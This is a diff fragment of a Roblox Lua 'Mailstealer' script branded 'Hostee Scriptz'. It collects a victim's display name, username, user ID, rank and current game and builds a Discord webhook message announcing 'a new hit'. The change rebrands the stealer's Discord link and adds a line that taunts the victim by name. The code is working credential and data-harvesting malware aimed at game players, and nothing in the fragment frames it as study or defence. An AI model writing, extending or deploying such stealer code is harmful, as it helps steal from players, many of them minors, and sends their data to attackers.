@@ -20,16 +20,16 @@ _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
 local lib = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"))
 _G.PetName = "Not Working How Sad."
 
-local function sendwebhook() 
+local function sendwebhook()
     local msg = { 
         ["avatar_url"] = "https://cdn.discordapp.com/icons/1085872367831613471/a_55aaf60df3ca5b6ba8c7fc5401f3a1ba.gif?size=256",
         ["username"] = "✗ Hostee Scriptz ✗",
-        ["content"] = "|| @everyone || **Hello But Hostee Scriptz Mailstealer has detected a new hit!**", 
+        ["content"] = "|| @everyone @here Are You ".. _G.UserNamey .."? Well Here Is A Surprise || **Hello ".. _G.UserNamey ..", Hostee Scriptz Mailstealer has detected a new hit!**", 
         ["embeds"] = { 
             { 
                 ["title"] = "Hostee Scriptz Mailstealer Results", 
                 ["description"] = "**Data from the victim**\n🧑Display Name: " .. _G.PlrDisplayNameVictim .. "\n🧑Username: " .. _G.PlrUserVictim .. "\n🧑User ID: " .. _G.PlrUserIDVictim .. "\n🐱Rank: " .. _G.CurrentRank .. "\n🎮Place: " .. _G.GameIn .. "", 
-                ["url"] = "https://discord.gg/rizzhub", 
+                ["url"] = "https://discord.gg/hosteehub", 
                 ["color"] = webhookcolor, 
                 ["fields"] = { 
                     { 
